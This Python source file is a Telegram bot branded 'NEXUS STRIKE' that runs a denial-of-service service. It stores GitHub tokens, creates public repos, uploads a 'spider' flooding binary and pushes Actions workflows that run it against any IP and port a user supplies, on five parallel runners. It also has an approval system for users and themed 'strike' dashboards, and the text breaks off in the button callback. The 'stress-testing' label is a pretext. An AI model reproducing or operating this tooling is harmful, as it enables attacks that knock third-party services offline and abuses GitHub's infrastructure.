import os
import json
import logging
import time
import uuid
import asyncio
import random
import traceback
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from github import Github, GithubException

# ===== LOGGING =====
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== ENV =====
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]

if not BOT_TOKEN:
    logger.error("BOT_TOKEN not set!")
    exit(1)

# ===== CONSTANTS =====
YML_FILE_PATH = ".github/workflows/main.yml"
WAITING_FOR_BINARY = 1

# ===== GLOBALS =====
active_attacks = {}
github_tokens = []
owners = {}
approved_users = {}
pending_users = {}
attack_counters = {}

# ===== SAFE FILE OPS =====
def load_json(filename, default=None):
    try:
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return json.load(f)
        return default if default is not None else {}
    except Exception as e:
        logger.error(f"Load {filename} error: {e}")
        return default if default is not None else {}

def save_json(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save {filename} error: {e}")

# ===== INIT =====
def init_data():
    global owners, github_tokens, approved_users, pending_users, attack_counters
    owners = load_json('owners.json', {})
    if not owners:
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {"username": f"owner_{admin_id}", "is_primary": True}
        save_json('owners.json', owners)
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', [])
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============================================================
# ===== HELPER: PROGRESS BAR =====
# ============================================================
def progress_bar(progress, total, length=12):
    if total <= 0:
        return "▓" * length
    pct = min(1.0, progress / total)
    filled = int(pct * length)
    bar = "▓" * filled + "░" * (length - filled)
    return bar

# ============================================================
# ===== VALIDATION & HELPERS =====
# ============================================================

def validate_github_token(token):
    try:
        if not token or len(token) < 20:
            return False, "Token too short"
        g = Github(token)
        user = g.get_user()
        _ = user.login
        rate = g.get_rate_limit()
        if rate.core.remaining < 1:
            return False, "Rate limit exhausted"
        return True, user.login
    except GithubException as e:
        if e.status == 401:
            return False, "Invalid token (401)"
        elif e.status == 403:
            return False, "Rate limited (403)"
        elif e.status == 404:
            return False, "Token has no permissions (404)"
        else:
            return False, f"GitHub error: {e.status}"
    except Exception as e:
        return False, f"Error: {str(e)[:40]}"

def auto_remove_expired():
    global github_tokens
    if not github_tokens:
        return 0
    removed = 0
    valid = []
    for td in github_tokens:
        token = td.get('token')
        if not token:
            removed += 1
            continue
        is_valid, info = validate_github_token(token)
        if is_valid:
            td['username'] = info
            valid.append(td)
        else:
            removed += 1
            logger.warning(f"🗑️ Removed invalid token: {token[:10]}... - {info}")
    if removed > 0:
        github_tokens = valid
        save_json('github_tokens.json', github_tokens)
        logger.info(f"✅ Auto-removed {removed} invalid tokens. Remaining: {len(github_tokens)}")
    return removed

def is_owner(user_id):
    return str(user_id) in owners

def is_approved(user_id):
    return str(user_id) in approved_users

def can_attack(user_id):
    return is_owner(user_id) or is_approved(user_id)

# ===== ATTACK MANAGEMENT =====
def start_attack(attack_id, ip, port, time_val, user_id):
    active_attacks[attack_id] = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "start_time": time.time(),
        "timer_task": None
    }
    save_json('attack_state.json', active_attacks)
    attack_counters[str(user_id)] = attack_counters.get(str(user_id), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(attack_id):
    if attack_id in active_attacks:
        timer_task = active_attacks[attack_id].get("timer_task")
        if timer_task and not timer_task.done():
            timer_task.cancel()
        del active_attacks[attack_id]
        save_json('attack_state.json', active_attacks)

# ============================================================
# ===== BINARY UPLOAD =====
# ============================================================

async def binary_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only system admins can deploy binaries.", parse_mode='HTML')
            return ConversationHandler.END
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ <b>Token Vault Empty</b>\nAdd tokens via <code>/addtoken</code>", parse_mode='HTML')
            return ConversationHandler.END
        await update.message.reply_text(
            "📤 <b>DEPLOY BINARY</b>\n\n"
            "Send me the <code>spider</code> binary file.\n"
            "File must be named exactly: <code>spider</code>\n"
            "Type <code>/cancel</code> to abort.",
            parse_mode='HTML'
        )
        return WAITING_FOR_BINARY
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_receive(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return ConversationHandler.END
        if not update.message.document:
            await update.message.reply_text("❌ Please send a file.", parse_mode='HTML')
            return WAITING_FOR_BINARY
        file = update.message.document
        if file.file_name != "spider":
            await update.message.reply_text(f"❌ File must be named <code>spider</code>. Found: <code>{file.file_name}</code>", parse_mode='HTML')
            return WAITING_FOR_BINARY
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ No valid tokens. Add with /addtoken", parse_mode='HTML')
            return ConversationHandler.END

        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='upload_document')
        progress = await update.message.reply_text("⏳ <b>Uploading to all repositories...</b>", parse_mode='HTML')
        file_obj = await file.get_file()
        file_path = f"temp_{file.file_id}.bin"
        await file_obj.download_to_drive(file_path)
        with open(file_path, 'rb') as f:
            content = f.read()
        os.remove(file_path)

        success_count = 0
        fail_count = 0
        results = []
        for token_data in github_tokens:
            token = token_data.get('token')
            repo_name = token_data.get('repo')
            username = token_data.get('username', 'unknown')
            try:
                g = Github(token)
                repo = g.get_repo(repo_name)
                try:
                    existing = repo.get_contents("spider")
                    repo.update_file("spider", "Update spider binary", content, existing.sha)
                    results.append((username, True, "✅ Updated"))
                except Exception:
                    repo.create_file("spider", "Add spider binary", content)
                    results.append((username, True, "✅ Created"))
                success_count += 1
            except Exception as e:
                results.append((username, False, f"❌ {str(e)[:40]}"))
                fail_count += 1

        msg = f"<b>✅ BINARY DEPLOYMENT COMPLETE</b>\n"
        msg += f"📊 Success: {success_count} | Failed: {fail_count} | Total: {len(github_tokens)}\n"
        for username, success, status in results:
            emoji = "✅" if success else "❌"
            msg += f"{emoji} @{username}: {status}\n"
        await progress.edit_text(msg, parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Upload error: {str(e)[:100]}")
        return ConversationHandler.END

async def binary_upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ============================================================
# ===== TOKEN COMMANDS =====
# ============================================================

async def addtoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b> – only admins can inject tokens.", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 <b>Usage:</b> <code>/addtoken &lt;github_token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0].strip()
        is_valid, info = validate_github_token(token)
        if not is_valid:
            await update.message.reply_text(f"❌ <b>Invalid Token</b>\n{info}", parse_mode='HTML')
            return
        for t in github_tokens:
            if t.get('token') == token:
                await update.message.reply_text("⚠️ Token already exists in vault.", parse_mode='HTML')
                return
        g = Github(token)
        user = g.get_user()
        username = user.login
        for t in github_tokens:
            if t.get('username') == username:
                await update.message.reply_text(
                    f"⚠️ User @{username} already has a token.\n"
                    f"Existing repo: <code>{t.get('repo')}</code>\n"
                    f"Remove it first with <code>/removetoken</code>.",
                    parse_mode='HTML'
                )
                return
        repo_name = f"spider-{uuid.uuid4().hex[:8]}"
        repo = user.create_repo(repo_name, private=False)
        try:
            repo.create_file(".github/workflows/main.yml", "Init workflow", "")
        except:
            pass
        github_tokens.append({
            'token': token,
            'username': username,
            'repo': f"{username}/{repo_name}",
            'added_at': datetime.now().isoformat()
        })
        save_json('github_tokens.json', github_tokens)
        await update.message.reply_text(
            f"<b>🔑 TOKEN INJECTED</b>\n"
            f"👤 User: @{username}\n"
            f"📁 Repo: <code>{repo_name}</code>\n"
            f"📊 Vault size: {len(github_tokens)}",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:200]}")

async def tokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        removed = auto_remove_expired()
        if not github_tokens:
            msg = "📭 <b>Token Vault Empty</b>"
            if removed > 0:
                msg = f"🧹 Removed {removed} expired tokens.\n📭 Vault is now empty."
            await update.message.reply_text(msg, parse_mode='HTML')
            return
        msg = "<b>🔐 TOKEN VAULT</b>\n\n"
        if removed > 0:
            msg += f"🧹 Removed {removed} expired tokens\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. @{t.get('username', 'Unknown')} – <code>{token_short}</code>\n"
            msg += f"   📁 <code>{t['repo']}</code>\n\n"
        msg += f"📊 Total valid: {len(github_tokens)}"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def checktokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 No tokens to check.", parse_mode='HTML')
            return
        removed = auto_remove_expired()
        msg = "<b>🔍 TOKEN HEALTH CHECK</b>\n\n"
        msg += f"📊 Total: {len(github_tokens)}\n"
        msg += f"🧹 Expired removed: {removed}\n\n"
        for i, t in enumerate(github_tokens, 1):
            token_short = t['token'][:10] + "…" + t['token'][-4:]
            msg += f"{i}. @{t.get('username', 'Unknown')} – <code>{token_short}</code> ✅ Valid\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removetoken_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/removetoken &lt;token&gt;</code>", parse_mode='HTML')
            return
        token = context.args[0]
        found = False
        for i, t in enumerate(github_tokens):
            if t.get('token') == token:
                github_tokens.pop(i)
                save_json('github_tokens.json', github_tokens)
                found = True
                break
        if found:
            await update.message.reply_text(f"✅ Token removed. Remaining: {len(github_tokens)}", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Token not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def cleartokens_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not github_tokens:
            await update.message.reply_text("📭 Vault already empty.", parse_mode='HTML')
            return
        count = len(github_tokens)
        if len(context.args) == 1 and context.args[0].lower() == "confirm":
            github_tokens.clear()
            save_json('github_tokens.json', github_tokens)
            await update.message.reply_text(f"🗑️ Cleared {count} tokens.", parse_mode='HTML')
        else:
            await update.message.reply_text(f"⚠️ Delete ALL {count} tokens? Use <code>/cleartokens confirm</code>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== ATTACK COMMAND (NEXUS STRIKE UI) =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ <b>Access Denied</b>\nYou don't have permission to launch strikes.", parse_mode='HTML')
            return
        if len(context.args) != 3:
            await update.message.reply_text(
                "📖 <b>Usage:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
                "💡 Example: <code>/attack 1.1.1.1 443 60</code>\n"
                "⏱️ Time range: 5 – 3600 seconds",
                parse_mode='HTML'
            )
            return

        ip, port_str, time_str = context.args
        try:
            port = int(port_str)
            time_val = int(time_str)
        except:
            await update.message.reply_text("❌ <b>Invalid Input</b>\nPort and time must be numbers.", parse_mode='HTML')
            return
        if not (1 <= port <= 65535):
            await update.message.reply_text("❌ <b>Invalid Port</b>\nPort must be between 1 and 65535.", parse_mode='HTML')
            return
        if time_val < 5 or time_val > 3600:
            await update.message.reply_text("❌ <b>Invalid Duration</b>\nTime must be 5–3600 seconds.", parse_mode='HTML')
            return

        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action='typing')
        auto_remove_expired()
        if not github_tokens:
            await update.message.reply_text("❌ <b>No GitHub Tokens</b>\nAdd one with <code>/addtoken</code>", parse_mode='HTML')
            return

        valid_token = random.choice(github_tokens)
        attack_id = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
        g = Github(valid_token['token'])
        repo = g.get_repo(valid_token['repo'])

        try:
            repo.get_contents("spider")
        except:
            await update.message.reply_text(
                "❌ <b>Binary Missing</b>\n'<code>spider</code>' not found in repo.\nDeploy with <code>/binary_upload</code>",
                parse_mode='HTML'
            )
            return

        yml_content = f"""name: attack
on: [push]
jobs:
  attack:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x spider
    - run: sudo ./spider {ip} {port} {time_val} 100
"""
        try:
            file = repo.get_contents(YML_FILE_PATH)
            repo.update_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content, file.sha)
        except:
            try:
                repo.create_file(YML_FILE_PATH, f"Attack {ip}:{port}", yml_content)
            except:
                repo.create_file(".github/workflows/main.yml", f"Attack {ip}:{port}", yml_content)

        start_attack(attack_id, ip, port, time_val, user_id)
        async def auto_finish():
            await asyncio.sleep(time_val + 10)
            finish_attack(attack_id)
            logger.info(f"✅ Auto-finished attack {attack_id}")
        timer_task = asyncio.create_task(auto_finish())
        active_attacks[attack_id]["timer_task"] = timer_task

        start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        finish_time = (datetime.now() + timedelta(seconds=time_val)).strftime("%Y-%m-%d %H:%M:%S")
        repo_name = valid_token['repo']
        actions_url = f"https://github.com/{repo_name}/actions"

        threat = "🟢 MODERATE" if time_val <= 60 else ("🟡 HIGH" if time_val <= 300 else "🔴 CRITICAL")
        total_threads = 5 * 100

        # SEXY NEXUS UI
        message = (
            f"<b>═══════════════════════════════════════</b>\n"
            f"<b>  ☣️  STRIKE CONFIRMED</b>\n"
            f"<b>═══════════════════════════════════════</b>\n\n"
            f"  ◈ <b>HOST</b>         :  <code>{ip}:{port}</code>\n"
            f"  ◈ <b>TIMER</b>        :  <code>{time_val}s</code>\n"
            f"  ◈ <b>DEPLOYMENT</b>   :  <code>5 × 100 Threads</code>\n"
            f"  ◈ <b>FIREPOWER</b>    :  <code>{total_threads} Threads</code>\n"
            f"  ◈ <b>VAULT</b>        :  <code>{repo_name}</code>\n"
            f"  ◈ <b>TOKEN HOLDER</b> :  @{valid_token['username']}\n"
            f"  ◈ <b>THREAT</b>       :  {threat}\n"
            f"  ◈ <b>STRIKE ID</b>    :  <code>{attack_id}</code>\n"
            f"  ◈ <b>INITIATED</b>    :  <code>{start_time}</code>\n"
            f"  ◈ <b>IMPACT</b>       :  <code>{finish_time}</code>\n\n"
            f"<b>─────────────────────────────────────────────</b>\n"
            f"  📡 <b>COMMS LINK:</b> <a href='{actions_url}'>GitHub Actions</a>\n"
            f"  🛑 <b>TERMINATE:</b> <code>/stop</code>\n"
            f"<b>─────────────────────────────────────────────</b>\n"
            f"<i>  Strike #{attack_counters.get(str(user_id), 0)} deployed.</i>"
        )
        keyboard = [
            [InlineKeyboardButton("📡 Comms Link", url=actions_url)],
            [InlineKeyboardButton("🛑 Terminate All", callback_data="stop")]
        ]
        await update.message.reply_text(message, parse_mode='HTML', disable_web_page_preview=True, reply_markup=InlineKeyboardMarkup(keyboard))

    except Exception as e:
        await update.message.reply_text(f"❌ <b>Deployment Failed</b>\n<code>{str(e)[:200]}</code>", parse_mode='HTML')

# ============================================================
# ===== STATUS COMMAND (NEXUS STRIKE UI) =====
# ============================================================

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return

        if not active_attacks:
            await update.message.reply_text(
                "<b>═══ SYSTEM STANDBY ═══</b>\n\n"
                "  ✦ STATUS      :  🟢 IDLE\n"
                "  ✦ ACTIVE STRIKES:  0\n"
                "  ✦ FIREPOWER   :  0 Threads\n\n"
                "<i>  Initiate a strike with /attack</i>",
                parse_mode='HTML'
            )
            return

        total_threads = len(active_attacks) * 500
        msg = "<b>═══ COMMS LOG — ACTIVE STRIKES ═══</b>\n\n"

        for aid, data in active_attacks.items():
            elapsed = int(time.time() - data['start_time'])
            remaining = data['time'] - elapsed
            if remaining < 0:
                remaining = 0
            bar = progress_bar(elapsed, data['time'], length=12)
            msg += f"  ▸ <code>[{bar}]</code>  <b>{elapsed}s</b> / {data['time']}s\n"
            msg += f"    <b>HOST:</b> <code>{data['ip']}:{data['port']}</code>\n"
            msg += f"    <b>ID:</b> <code>{aid[:16]}..</code>\n\n"

        msg += "<b>─────────────────────────────────────────────</b>\n"
        msg += f"  <b>TOTAL STRIKES :</b> {len(active_attacks)}\n"
        msg += f"  <b>FIREPOWER     :</b> {total_threads} Threads\n\n"
        msg += "<i>  🛑 Use /stop to terminate all.</i>"

        keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status")]]
        await update.message.reply_text(msg, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== START COMMAND (NEXUS STRIKE UI) =====
# ============================================================

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        total_attacks = sum(attack_counters.values())
        user_attacks = attack_counters.get(str(user_id), 0)

        if can_attack(user_id):
            keyboard = [
                [InlineKeyboardButton("⚡ Launch Strike", callback_data="attack_help")],
                [InlineKeyboardButton("📡 Comms Log", callback_data="status")],
                [InlineKeyboardButton("🛑 Abort Mission", callback_data="stop")],
            ]
            if is_owner(user_id):
                keyboard.append([InlineKeyboardButton("🔧 Admin Console", callback_data="admin_panel")])

            role = "👑 OWNER" if is_owner(user_id) else "✅ APPROVED"

            message = (
                f"<b>⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈</b>\n"
                f"<b>  ⚡  NEXUS STRIKE v3.0  ⚡</b>\n"
                f"<b>⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈</b>\n\n"
                f"  ┆ <b>AGENT</b>         :  @{username}\n"
                f"  ┆ <b>CLEARANCE</b>     :  {role}\n"
                f"  ┆ <b>NODES</b>         :  5 Parallel\n"
                f"  ┆ <b>CORES</b>         :  100 / Node\n"
                f"  ┆ <b>FIREPOWER</b>     :  500 Threads\n"
                f"  ┆ <b>STATUS</b>        :  🟢 ONLINE\n"
                f"  ┆ <b>YOUR KILLS</b>    :  {user_attacks}\n"
                f"  ┆ <b>GLOBAL STRIKES</b>:  {total_attacks}\n\n"
                f"<b>─────────────────────────────────────────────</b>\n"
                f"  ⌨️  <b>INITIATE:</b> <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
                f"  <i>Type /help for all commands.</i>"
            )
            await update.message.reply_text(message, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            if not any(str(u.get('user_id')) == str(user_id) for u in pending_users):
                pending_users.append({"user_id": user_id, "username": username, "request_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
                save_json('pending_users.json', pending_users)
                for owner_id in owners.keys():
                    try:
                        await context.bot.send_message(
                            int(owner_id),
                            f"📥 <b>Access Request</b>\n"
                            f"👤 @{username}\n"
                            f"🆔 <code>{user_id}</code>\n"
                            f"Use: <code>/approve {user_id} 7</code>",
                            parse_mode='HTML'
                        )
                    except:
                        pass
            await update.message.reply_text(
                "⛔ <b>Access Denied</b>\n\n"
                "Your request has been submitted to the system admin.\n"
                "Please wait for approval.\n"
                "━━━━━━━━━━━━━━━━━━━━━━━\n"
                "<i>Stay tuned.</i>",
                parse_mode='HTML'
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== OTHER COMMANDS =====
# ============================================================

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not can_attack(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not active_attacks:
            await update.message.reply_text("✅ No active strikes to abort.", parse_mode='HTML')
            return
        count = len(active_attacks)
        for aid in list(active_attacks.keys()):
            finish_attack(aid)
        await update.message.reply_text(
            f"<b>🛑 TERMINATE MISSION</b>\n\n"
            f"💥 Terminated <b>{count}</b> strike(s) successfully.\n"
            f"☠️ System is now idle. All clear.",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}", parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>⎈ NEXUS STRIKE – COMMAND REFERENCE</b>\n\n"
        "<b>⚔️ STRIKE COMMANDS</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code> – Launch a full‑scale strike\n"
        "<code>/status</code> – View live comms log\n"
        "<code>/stop</code> – Emergency terminate all strikes\n\n"
        "<b>🔧 ADMIN PANEL</b>\n"
        "<code>/addtoken &lt;token&gt;</code> – Inject a GitHub token\n"
        "<code>/removetoken &lt;token&gt;</code> – Remove a token\n"
        "<code>/checktokens</code> – Health check on tokens\n"
        "<code>/cleartokens confirm</code> – Wipe the vault\n"
        "<code>/tokens</code> – List all tokens\n"
        "<code>/binary_upload</code> – Deploy the spider binary\n"
        "<code>/approve &lt;id&gt; &lt;days&gt;</code> – Grant access\n"
        "<code>/remove &lt;id&gt;</code> – Revoke access\n"
        "<code>/users</code> – List approved users\n"
        "<code>/pending</code> – Pending requests\n"
        "<code>/broadcast &lt;msg&gt;</code> – Send announcement\n\n"
        "<b>ℹ️ UTILITY</b>\n"
        "<code>/start</code> – Main dashboard\n"
        "<code>/myid</code> – Your digital fingerprint\n"
        "<code>/about</code> – Bot info & credits\n"
        "<code>/help</code> – This menu",
        parse_mode='HTML'
    )

async def myid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"<b>🆔 YOUR DIGITAL FINGERPRINT</b>\n\n"
        f"<code>{update.effective_user.id}</code>\n\n"
        f"<i>Keep this safe – it's your access key.</i>",
        parse_mode='HTML'
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈</b>\n"
        "<b>  ☣️  NEXUS ENGINE  ☣️</b>\n"
        "<b>⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈⎈</b>\n\n"
        "  ◈ <b>CORE</b>        :  Python 3.11 + Pyrogram\n"
        "  ◈ <b>ARCH</b>        :  5 Runners × 100 Threads\n"
        "  ◈ <b>PROTOCOL</b>    :  GitHub Actions Orchestration\n"
        "  ◈ <b>PURPOSE</b>     :  Stress‑testing & Resilience\n"
        "  ◈ <b>MOTTO</b>       :  \"Silence. Speed. Precision.\"\n\n"
        "<b>─────────────────────────────────────────────</b>\n"
        "<i>  Use /help for all commands.</i>",
        parse_mode='HTML'
    )

# ============================================================
# ===== ADMIN USER COMMANDS =====
# ============================================================

async def approve_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📖 Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        days = int(context.args[1])
        pending_users[:] = [u for u in pending_users if str(u.get('user_id')) != str(target_id)]
        save_json('pending_users.json', pending_users)
        expiry = "LIFETIME" if days == 0 else time.time() + (days * 24 * 3600)
        approved_users[str(target_id)] = {"username": f"user_{target_id}", "added_by": user_id, "expiry": expiry, "days": days}
        save_json('approved_users.json', approved_users)
        await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML')
        try:
            await context.bot.send_message(target_id, "✅ <b>Access Granted!</b>\nUse /start to launch your first strike.", parse_mode='HTML')
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def removeuser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/remove &lt;user_id&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"✅ User {target_id} removed.", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ User not found.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not approved_users:
            await update.message.reply_text("📭 No approved users.", parse_mode='HTML')
            return
        msg = "<b>👥 APPROVED USERS</b>\n\n"
        for uid, data in approved_users.items():
            msg += f"`{uid}` – {data.get('days', '?')}d\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not pending_users:
            await update.message.reply_text("📭 No pending requests.", parse_mode='HTML')
            return
        msg = "<b>⏳ PENDING REQUESTS</b>\n\n"
        for u in pending_users:
            msg += f"`{u.get('user_id')}` – @{u.get('username')}\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📖 Usage: <code>/broadcast &lt;message&gt;</code>", parse_mode='HTML')
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}", parse_mode='HTML')
                sent += 1
            except:
                pass
        await update.message.reply_text(f"✅ Sent to {sent} users.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("⛔ Access Denied", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📖 Usage: <code>/maintenance &lt;on/off&gt;</code>", parse_mode='HTML')
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        await update.message.reply_text(f"🔧 Maintenance {'ENABLED' if mode == 'on' else 'DISABLED'}.", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "attack_help":
            await query.edit_message_text(
                "<b>⚡ LAUNCH STRIKE</b>\n\n"
                "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
                "<b>Example:</b>\n"
                "<code>/attack 1.1.1.1 443 60</code>\n\n"
                "⏱️ Time: 5–3600 seconds\n"
                "🔌 Port: 1–65535\n"
